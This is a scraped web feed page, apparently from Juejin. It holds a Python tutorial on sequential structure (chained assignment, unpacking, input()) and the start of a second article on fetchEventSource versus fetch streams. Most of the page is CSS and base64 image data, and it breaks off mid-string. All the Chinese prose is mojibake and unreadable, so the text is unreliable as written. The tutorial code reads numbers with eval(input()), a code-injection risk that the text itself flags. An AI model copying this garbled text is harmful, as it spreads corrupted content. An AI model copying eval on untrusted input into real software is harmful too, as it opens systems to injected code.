jggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><blockquote>
<p><strong>å¼•è¨€</strong><br/>
æ‰€è°“çš„ç¼–ç¨‹ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹<strong>æ§åˆ¶æµ</strong>çš„é©¾é©­ã€‚æ— è®ºç®—æ³•å¤šä¹ˆå¤æ‚ï¼Œæœ€ç»ˆéƒ½è¦è½¬åŒ–ä¸ºæœºå™¨å¯æ‰§è¡Œçš„çº¿æ€§æŒ‡ä»¤ã€‚ä»Šå¤©æˆ‘ä»¬é‡è¯»ã€Šè·Ÿç€å¨Ÿå­å§å­¦Pythonã€‹ç¬¬4ç« ï¼ŒèŠèŠç¨‹åºæè¿°çš„å·¥ç¨‹ä»·å€¼ï¼Œä»¥åŠPythonä¸­æœ€åŸºç¡€çš„é¡ºåºç»“æ„èƒŒåé‚£äº›ä¼˜é›…çš„è®¾è®¡ã€‚</p>
</blockquote>
<h3 data-id="heading-0">ä¸€ã€ç®—æ³•çš„å¯è§†åŒ–ï¼šç¨‹åºçš„æè¿°æ–¹å¼</h3>
<p>åœ¨å·¥ç¨‹å®è·µä¸­ï¼Œä»£ç å®ç°åªæ˜¯æœ€åçš„ä¸€ç¯ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§ä¸å…·ä½“è¯­è¨€æ— å…³çš„æ–¹å¼æ¥æè¿°ç®—æ³•é€»è¾‘ã€‚æ–‡ä¸­æåˆ°çš„ä¸‰ç§æ–¹å¼ï¼Œåˆ†åˆ«å¯¹åº”äº†ä¸åŒåœºæ™¯ä¸‹çš„éœ€æ±‚ï¼š</p>
<h4 data-id="heading-1">1. IPOæ¨¡å‹ï¼šæ•°æ®æµçš„æœ¬è´¨</h4>
<p>Input -&gt; Process -&gt; Outputã€‚è¿™ä¸ä»…æ˜¯ç¼–å†™Pythonç¨‹åºçš„æ­¥éª¤ï¼Œæ›´æ˜¯æ‰€æœ‰æ•°æ®å¤„ç†çš„é€šç”¨èŒƒå¼ã€‚å®ƒæé†’æˆ‘ä»¬ï¼š<strong>ä¸è¦ä¸€ä¸Šæ¥å°±å†™ä»£ç ï¼Œå…ˆææ¸…æ¥šè¾“å…¥æ˜¯ä»€ä¹ˆï¼Œè¦è¾“å‡ºä»€ä¹ˆ</strong>ã€‚</p>
<h4 data-id="heading-2">2. æµç¨‹å›¾ï¼šé€»è¾‘çš„å¯è§†åŒ–</h4>
<p>æµç¨‹å›¾é€šè¿‡æ ‡å‡†çš„ç¬¦å·ï¼ˆèµ·æ­¢æ¡†ã€åˆ¤æ–­æ¡†ç­‰ï¼‰å°†é€»è¾‘å…·è±¡åŒ–ã€‚</p>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå‘éæŠ€æœ¯äººå‘˜è§£é‡Šé€»è¾‘ï¼Œæˆ–è€…ç”¨äºå¤æ‚çš„ç®—æ³•è®¾è®¡è¯„å®¡ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caeb9037619242b986c60a804c8d1daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=LFOCHKipGbSYuXjLP26hTjyE9LQ%3D" alt="image.png" loading="lazy"/></li>
</ul>
<h4 data-id="heading-3">3. ä¼ªä»£ç ï¼šè¯­è¨€çš„æ— å…³æ€§</h4>
<p>ä¼ªä»£ç æ˜¯é€»è¾‘çš„â€œéª¨æ¶â€ã€‚å®ƒå‰¥ç¦»äº†è¯­æ³•çš„ç»†èŠ‚ï¼Œåªä¿ç•™ç®—æ³•æ ¸å¿ƒã€‚ä¾‹å¦‚è®¡ç®—åœ†çš„é¢ç§¯ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cb8c4c717b2434b81aa4b37331bc396~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=z2%2BPmSRUGtH1v9unWTNrDvhxwec%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥å…ˆä¸“æ³¨äºç®—æ³•çš„æ­£ç¡®æ€§ï¼Œå†è€ƒè™‘å…·ä½“çš„å®ç°ç»†èŠ‚ã€‚</p>
</blockquote>
<h3 data-id="heading-4">äºŒã€é¡ºåºæ‰§è¡Œä¸Pythonçš„è¯­æ³•ç³–</h3>
<p>é¡ºåºç»“æ„æ˜¯æ‰€æœ‰ç¼–ç¨‹è¯­è¨€é»˜è®¤çš„æ‰§è¡Œæµï¼š<code>Statement1 -&gt; Statement2 -&gt; Statement3</code>ã€‚ä½†åœ¨Pythonä¸­ï¼Œç”±äºå…¶å¯¹èµ‹å€¼æ“ä½œçš„å¼ºå¤§æ”¯æŒï¼Œé¡ºåºç»“æ„å†™èµ·æ¥æ ¼å¤–â€œæ€§æ„Ÿâ€ã€‚</p>
<h4 data-id="heading-5">2.1 é“¾å¼èµ‹å€¼</h4>
<pre><code class="hljs language-python" lang="python">a = b = c = <span class="hljs-number">100</span>
</code></pre>
<p>è¿™ä¸ä»…å‡å°‘äº†ä»£ç è¡Œæ•°ï¼Œæ›´é‡è¦çš„æ˜¯å®ƒä¿è¯äº†å¤šä¸ªå˜é‡å¼•ç”¨çš„æ˜¯<strong>åŒä¸€ä¸ªå†…å­˜å¯¹è±¡</strong>ï¼ˆå¯¹äºä¸å¯å˜å¯¹è±¡å¦‚æ•´æ•°ï¼‰ã€‚</p>
<h4 data-id="heading-6">2.2 åºåˆ—è§£åŒ…</h4>
<p>è¿™æ˜¯PythonåŒºåˆ«äºC/Javaçš„ä¸€å¤§ç‰¹è‰²ã€‚</p>
<pre><code class="hljs language-python" lang="python">a, b, c, d = <span class="hljs-string">'room'</span>  <span class="hljs-comment"># å­—ç¬¦ä¸²ä¹Ÿæ˜¯åºåˆ—</span>
</code></pre>
<ul>
<li><strong>åŸç†</strong>ï¼šç­‰å·å³è¾¹æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œå·¦è¾¹æ˜¯å¯¹åº”æ•°é‡çš„å˜é‡ã€‚Pythonä¼šå°†åºåˆ—å…ƒç´ ä¾æ¬¡èµ‹å€¼ç»™å·¦è¾¹çš„å˜é‡ã€‚</li>
<li><strong>åº”ç”¨</strong>ï¼šè¿™ä¸ªç‰¹æ€§éå¸¸å¼ºå¤§ï¼Œå¸¸ç”¨äºå‡½æ•°å¤šè¿”å›å€¼çš„æ¥æ”¶ã€å˜é‡äº¤æ¢ï¼ˆ<code>a, b = b, a</code>ï¼‰ç­‰åœºæ™¯ã€‚</li>
</ul>
<h4 data-id="heading-7">2.3 è¾“å…¥ä¸ç±»å‹è½¬æ¢</h4>
<p>åœ¨Pythonä¸­ï¼Œ<code>input()</code> æ°¸è¿œè¿”å›å­—ç¬¦ä¸²ã€‚ä¸ºäº†è·å–æ•°å€¼å‹æ•°æ®ï¼Œæ–‡ä¸­ä½¿ç”¨äº† <code>eval()</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python">age = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹´é¾„:'</span>))
</code></pre>
<ul>
<li><strong>æ³¨æ„</strong>ï¼š<code>eval()</code> å‡½æ•°ä¼šæ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„Pythonè¡¨è¾¾å¼ï¼Œè™½ç„¶æ–¹ä¾¿ï¼Œä½†åœ¨å¤„ç†ä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥æ—¶å­˜åœ¨å®‰å…¨é£é™©ï¼ˆå¦‚æ³¨å…¥æ”»å‡»ï¼‰ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå»ºè®®ä½¿ç”¨ <code>int()</code> æˆ– <code>float()</code> è¿›è¡Œæ˜¾å¼ç±»å‹è½¬æ¢ã€‚</li>
</ul>
<h3 data-id="heading-8">ä¸‰ã€ä»£ç å®æˆ˜</h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶µç›–äº†èµ‹å€¼ã€è§£åŒ…ã€è¾“å…¥è¾“å‡ºçš„å®Œæ•´ç¤ºä¾‹ï¼ˆç¤ºä¾‹4-1ï¼‰ï¼Œå±•ç¤ºäº†Pythoné¡ºåºç»“æ„çš„å…¸å‹å†™æ³•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-comment"># èµ‹å€¼ä¸é“¾å¼èµ‹å€¼</span>
name = <span class="hljs-string">'ç‹æ°'</span>
a = b = c = d = <span class="hljs-number">100</span>
<span class="hljs-comment"># åºåˆ—è§£åŒ…</span>
a, b, c, d = <span class="hljs-string">'room'</span>
<span class="hljs-comment"># äº¤äº’å¼è¾“å…¥ä¸è¾“å‡º</span>
name = <span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å§“å:'</span>)
<span class="hljs-comment"># æ¨èå†™æ³•ï¼šage = int(input(...))</span>
age = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹´é¾„:'</span>)) 
lucky_number = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹¸è¿æ•°å­—:'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å§“å:'</span>, name)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¹´é¾„:'</span>, age)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¹¸è¿æ•°å­—:'</span>, lucky_number)
</code></pre>
<p><strong>è¿è¡Œæ•ˆæœï¼š</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc275b2d3b94a7c887fa3ee39217aba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=prozDyINHWo0paG%2FrH7VJazWlks%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">æ€»ç»“</h3>
<h2 data-id="heading-10">é¡ºåºç»“æ„è™½ç„¶ç®€å•ï¼Œä½†ç»“åˆPythonçš„<strong>é“¾å¼èµ‹å€¼</strong>å’Œ<strong>åºåˆ—è§£åŒ…</strong>ï¼Œèƒ½å†™å‡ºéå¸¸ä¼˜é›…çš„ä»£ç ã€‚æŒæ¡å¥½è¿™äº›åŸºç¡€ç‰¹æ€§ï¼Œæ˜¯ç¼–å†™é«˜è´¨é‡Pythonä»£ç çš„ç¬¬ä¸€æ­¥ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†æ¢è®¨<strong>é€‰æ‹©ç»“æ„ï¼ˆåˆ†æ”¯ï¼‰</strong>ï¼Œçœ‹çœ‹Pythonæ˜¯å¦‚ä½•å¤„ç†é€»è¾‘åˆ¤æ–­çš„ã€‚</h2></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592507671083483146</link>    <guid>https://juejin.cn/post/7592507671083483146</guid>    <pubDate>2026-01-08T01:45:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592507671083483146" data-draft-id="7592438587389362214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T01:45:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»‘åœŸè±†"/> <meta itemprop="url" content="https://juejin.cn/user/3421335917433006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3421335917433006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»‘åœŸè±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:45:27.000Z" title="Thu Jan 08 2026 01:45:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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